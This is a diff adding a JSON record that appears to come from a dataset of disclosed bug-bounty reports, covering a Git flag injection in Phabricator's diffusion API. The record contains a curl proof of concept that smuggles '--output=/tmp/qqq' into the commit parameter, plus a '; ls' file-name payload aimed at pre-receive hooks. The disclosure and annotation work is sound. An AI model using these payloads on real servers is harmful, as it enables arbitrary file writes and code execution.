@@ -1,0 +1,46 @@
+{
+  "reported_to": "Phabricator",
+  "reported_by": "crownpeanut ",
+  "title": "Git flag injection leads to arbitrary file write",
+  "content": "\nkeyword : mongoose\nPoC\nLogin and generate API token\nCreate a repo and push several commits to phabricator\nExecute diffusion api\nCode 152 Bytes\n1curl http://dev.localhost/api/diffusion.internal.gitrawdiffquery \\\n2    -d api.token=api-token \\\n3    -d commit=--output%3D/tmp/qqq \\\n4    -d repository=R2\nqqq file will be created in tmp directory. And the content of qqq contains the output of git log.\nDescription\ngit log command is used to show git history in phabricator.\nAPI such as diffusion.internal.gitrawdiffquery and several others use git log command to retrieve commit details.\nBecause lack of validation of commit parameter, this line will create command below when PoC is executed\nCode 78 Bytes\n1git log -n1 -M -C -B --raw -t 'abbrev=40' --pretty-format: '--output=/tmp/qqq'\nThe content of qqq after api is executed.\nCode 122 Bytes\n1$ cat /tmp/qqq\n2:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      a.c\nNotice that /tmp/qqqq is controllable path. By specifying the right path it is possible to do arbitrary write.\nIf /var/repo is owned by www-data, attacker could rewrite pre-receive hook by commit filename ; ls which the payload would be like file below.\nCode 123 Bytes\n1$ cat /tmp/qqq\n2:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      ; ls\nThis could be result in RCE when the next time pre-receive hook is called.\nImpact\nArbitrary file write in phabricator server. Depends on server configuration, it could result in RCE.\n\n",
+  "severity": [
+    8.5,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1627240380,
+  "report_url": "https://hackerone.com/reports/1070247",
+  "vuln_category": "API",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "steps": [
+    [
+      1,
+      "Login and generate an API token in Phabricator"
+    ],
+    [
+      2,
+      "Create a repository and push several commits to Phabricator"
+    ],
+    [
+      3,
+      "Execute the diffusion API with a crafted commit parameter containing a Git flag injection (e.g., --output=/tmp/qqq)"
+    ],
+    [
+      4,
+      "Observe that the specified file (/tmp/qqq) is created with the output of git log"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Git flag injection leading to arbitrary file write in Phabricator. By manipulating the 'commit' parameter in the diffusion API, an attacker can inject Git flags (like --output) to write arbitrary files on the server. This can potentially lead to remote code execution if the attacker can write to critical paths (e.g., pre-receive hooks).",
+  "reason": "The vulnerability involves understanding how Git flags can be injected into API parameters and how Phabricator processes these parameters in its diffusion API. The attack requires knowledge of Git command-line flags and the ability to predict or influence file paths on the server. The interaction between the API parameter and Git command execution is non-obvious but not overly complex.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
